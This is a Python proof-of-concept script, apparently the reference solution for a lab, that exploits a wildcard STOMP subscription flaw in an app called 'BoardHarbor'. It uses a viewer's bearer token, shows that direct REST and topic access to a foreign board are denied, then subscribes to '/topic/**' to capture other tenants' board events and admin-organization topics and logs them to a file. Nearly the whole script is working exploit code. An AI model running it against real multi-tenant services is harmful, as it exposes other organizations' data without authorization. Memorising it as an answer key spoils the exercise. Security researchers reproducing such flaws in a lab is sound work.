#!/usr/bin/env python3
"""Reproduce BoardHarbor's wildcard STOMP cross-tenant subscription."""

from __future__ import annotations

import argparse
import base64
from collections import deque
import json
from pathlib import Path
import random
import string
import sys
import time
from typing import Any
from urllib.error import HTTPError
from urllib.parse import urlparse
from urllib.request import Request, urlopen

import websocket


NUL = "\u0000"
DEFAULT_BASE_URL = "http://127.0.0.1:5080"


def decode_claims(token: str) -> dict[str, Any]:
    """Decode the local access token payload for evidence display."""
    try:
        payload = token.split(".")[1]
        payload += "=" * (-len(payload) % 4)
        return json.loads(base64.urlsafe_b64decode(payload))
    except (IndexError, ValueError, json.JSONDecodeError) as error:
        raise ValueError("The access token is not a decodable JWT") from error


def stomp_frame(
    command: str,
    headers: dict[str, str] | None = None,
    body: str = "",
) -> str:
    """Build a STOMP 1.2 frame terminated by a NULL byte."""
    header_lines = [
        f"{name}:{value}" for name, value in (headers or {}).items()
    ]
    return "\n".join([command, *header_lines, "", body]) + NUL


def parse_stomp(raw_frame: str) -> dict[str, Any]:
    """Parse one STOMP frame into its command, headers, and body."""
    raw_frame = raw_frame.rstrip(NUL)
    header_block, separator, body = raw_frame.partition("\n\n")
    lines = header_block.splitlines()
    headers: dict[str, str] = {}
    for line in lines[1:]:
        name, delimiter, value = line.partition(":")
        if delimiter:
            headers[name] = value
    return {
        "command": lines[0] if lines else "",
        "headers": headers,
        "body": body if separator else "",
    }


def parse_sockjs(raw_message: str) -> list[dict[str, Any]]:
    """Unwrap a SockJS server message into zero or more STOMP frames."""
    if not raw_message or raw_message in {"o", "h"}:
        return []
    encoded = raw_message[1:] if raw_message.startswith("a") else raw_message
    messages = json.loads(encoded)
    if not isinstance(messages, list):
        messages = [messages]
    return [
        parse_stomp(message)
        for message in messages
        if isinstance(message, str)
    ]


class StompSession:
    """Small synchronous SockJS/STOMP client used by the reference solution."""

    def __init__(self, base_url: str, access_token: str) -> None:
        parsed_url = urlparse(base_url)
        if parsed_url.scheme not in {"http", "https"} or not parsed_url.netloc:
            raise ValueError("--base-url must be an HTTP origin")
        websocket_scheme = "wss" if parsed_url.scheme == "https" else "ws"
        server_id = random.randint(100, 999)
        session_id = "".join(
            random.choices(string.ascii_lowercase + string.digits, k=8)
        )
        websocket_url = (
            f"{websocket_scheme}://{parsed_url.netloc}"
            f"/websocket/{server_id}/{session_id}/websocket"
        )
        origin = f"{parsed_url.scheme}://{parsed_url.netloc}"
        self.socket = websocket.create_connection(
            websocket_url,
            origin=origin,
            timeout=10,
        )
        self.pending_frames: deque[dict[str, Any]] = deque()
        opening_frame = self.socket.recv()
        if opening_frame != "o":
            self.close()
            raise RuntimeError(
                f"Expected SockJS opening frame, received {opening_frame!r}"
            )
        self.send(
            stomp_frame(
                "CONNECT",
                {
                    "accept-version": "1.2",
                    "Authorization": f"Bearer {access_token}",
                    "heart-beat": "0,0",
                },
            )
        )
        connected = self.receive(5)
        if connected["command"] != "CONNECTED":
            self.close()
            raise RuntimeError(
                "STOMP authentication failed: "
                f"{connected['headers'].get('message', connected['command'])}"
            )
        print(
            "        CONNECTED "
            f"user-name={connected['headers'].get('user-name')} "
            f"version={connected['headers'].get('version')}"
        )

    def send(self, frame: str) -> None:
        """Send one STOMP frame inside a SockJS client message."""
        self.socket.send(json.dumps([frame]))

    def receive(self, timeout_seconds: float) -> dict[str, Any]:
        """Receive the next STOMP frame, ignoring SockJS heartbeats."""
        if self.pending_frames:
            return self.pending_frames.popleft()
        deadline = time.monotonic() + timeout_seconds
        while time.monotonic() < deadline:
            self.socket.settimeout(max(0.1, deadline - time.monotonic()))
            try:
                raw_message = self.socket.recv()
            except websocket.WebSocketTimeoutException:
                continue
            frames = parse_sockjs(raw_message)
            if frames:
                self.pending_frames.extend(frames[1:])
                return frames[0]
        raise TimeoutError("Timed out waiting for a STOMP frame")

    def close(self) -> None:
        """Close the underlying WebSocket connection."""
        try:
            self.socket.close()
        except Exception:
            pass


def rest_control(base_url: str, access_token: str, board_id: str) -> None:
    """Prove that the attacker cannot retrieve the foreign board via REST."""
    print(f"STEP 2A REST control: GET /api/boards/{board_id}")
    request = Request(
        f"{base_url}/api/boards/{board_id}",
        headers={"Authorization": f"Bearer {access_token}"},
    )
    try:
        with urlopen(request, timeout=10) as response:
            status = response.status
            body = response.read().decode()
    except HTTPError as error:
        status = error.code
        body = error.read().decode()
    print(f"        HTTP {status} {body}")
    if status != 404:
        raise RuntimeError("Expected the foreign REST request to return 404")


def exact_topic_control(
    base_url: str,
    access_token: str,
    board_id: str,
) -> None:
    """Prove that the concrete foreign board subscription is denied."""
    destination = f"/topic/boards/{board_id}"
    print(f"\nSTEP 2B STOMP control: SUBSCRIBE {destination}")
    session = StompSession(base_url, access_token)
    try:
        session.send(
            stomp_frame(
                "SUBSCRIBE",
                {"id": "control-1", "destination": destination},
            )
        )
        response = session.receive(5)
        print(
            f"        {response['command']} "
            f"message={response['headers'].get('message')} "
            f"body={response['body']!r}"
        )
        if (
            response["command"] != "ERROR"
            or response["headers"].get("message") != "Access denied"
        ):
            raise RuntimeError(
                "Expected Access denied for the exact foreign topic"
            )
    finally:
        session.close()


def print_message(frame: dict[str, Any], message_number: int) -> None:
    """Print one received MESSAGE frame and a formatted JSON body."""
    destination = frame["headers"].get("destination", "unknown")
    print("\n" + "*" * 76)
    print(f"MESSAGE {message_number}: {destination}")
    print(f"message-id: {frame['headers'].get('message-id', 'unknown')}")
    try:
        print(json.dumps(json.loads(frame["body"]), indent=2))
    except json.JSONDecodeError:
        print(frame["body"])
    print("*" * 76)


def wildcard_exploit(
    base_url: str,
    access_token: str,
    board_id: str,
    duration: int,
    output_path: Path | None,
) -> None:
    """Subscribe to the wildcard and capture controlled cross-tenant events."""
    print("\nSTEP 3 EXPLOIT: SUBSCRIBE /topic/** on a fresh connection")
    session = StompSession(base_url, access_token)
    session.send(
        stomp_frame(
            "SUBSCRIBE",
            {
                "id": "wildcard-1",
                "destination": "/topic/**",
                "receipt": "wildcard-1",
            },
        )
    )
    response = session.receive(5)
    if response["command"] == "ERROR":
        print(
            "        ERROR "
            f"message={response['headers'].get('message', 'unknown')}"
        )
        print("\nRESULT: wildcard rejected; the broker is in fixed mode.")
        session.close()
        return
    if (
        response["command"] != "RECEIPT"
        or response["headers"].get("receipt-id") != "wildcard-1"
    ):
        session.close()
        raise RuntimeError(
            f"Unexpected wildcard response: {response['command']}"
        )
    print("        RECEIPT wildcard-1 (subscription accepted)")
    print(f"        now add or edit an item on victim board {board_id}")

    deadline = (
        float("inf") if duration == 0 else time.monotonic() + duration
    )
    message_count = 0
    board_seen = False
    admin_seen = False
    output_file = (
        output_path.open("a", encoding="utf-8") if output_path else None
    )
    try:
        while time.monotonic() < deadline:
            try:
                frame = session.receive(1)
            except TimeoutError:
                continue
            if frame["command"] != "MESSAGE":
                continue
            message_count += 1
            destination = frame["headers"].get("destination", "")
            board_seen = board_seen or destination == (
                f"/topic/boards/{board_id}"
            )
            admin_seen = admin_seen or destination.startswith(
                "/topic/admin/organizations/"
            )
            print_message(frame, message_count)
            if output_file:
                output_file.write(
                    json.dumps(
                        {
                            "capturedAt": time.time(),
                            **frame,
                        }
                    )
                    + "\n"
                )
                output_file.flush()
            if board_seen and admin_seen:
                break
    except KeyboardInterrupt:
        print("\n        stopped by operator")
    finally:
        if output_file:
            output_file.close()
        session.close()

    print(
        f"\nRESULT: {message_count} message(s); "
        f"foreign board={str(board_seen).lower()}; "
        f"admin topic={str(admin_seen).lower()}"
    )
    if not board_seen:
        raise RuntimeError("No event from the watched foreign board was captured")


def parse_arguments() -> argparse.Namespace:
    """Parse and validate reference-client arguments."""
    parser = argparse.ArgumentParser(
        description="BoardHarbor wildcard STOMP reproduction"
    )
    parser.add_argument(
        "-a",
        "--access-token",
        required=True,
        help="Viewer access token copied from the normal web client",
    )
    parser.add_argument(
        "-b",
        "--board",
        default="99002",
        help="foreign board identifier (default: 99002)",
    )
    parser.add_argument(
        "--base-url",
        default=DEFAULT_BASE_URL,
        help=f"lab origin (default: {DEFAULT_BASE_URL})",
    )
    parser.add_argument(
        "-d",
        "--duration",
        type=int,
        default=60,
        help="stream seconds; 0 waits until Ctrl+C (default: 60)",
    )
    parser.add_argument(
        "-o",
        "--out",
        type=Path,
        help="append received synthetic evidence as JSON Lines",
    )
    arguments = parser.parse_args()
    arguments.access_token = arguments.access_token.removeprefix("Bearer ").strip()
    arguments.base_url = arguments.base_url.rstrip("/")
    if not arguments.board.isdigit():
        parser.error("--board must be numeric")
    if arguments.duration < 0:
        parser.error("--duration must be zero or positive")
    return arguments


def main() -> None:
    """Run the complete control-to-exploit evidence sequence."""
    arguments = parse_arguments()
    claims = decode_claims(arguments.access_token)
    print("STEP 1 attacker token copied from the normal web client")
    print(
        f"        sub={claims.get('sub')} "
        f"userType={claims.get('userType')} "
        f"orgId={claims.get('orgId')} "
        f"exp={claims.get('exp')}"
    )
    rest_control(
        arguments.base_url,
        arguments.access_token,
        arguments.board,
    )
    exact_topic_control(
        arguments.base_url,
        arguments.access_token,
        arguments.board,
    )
    wildcard_exploit(
        arguments.base_url,
        arguments.access_token,
        arguments.board,
        arguments.duration,
        arguments.out,
    )


if __name__ == "__main__":
    try:
        main()
    except (OSError, RuntimeError, ValueError) as error:
        print(f"\nFAILED: {error}", file=sys.stderr)
        raise SystemExit(1) from error
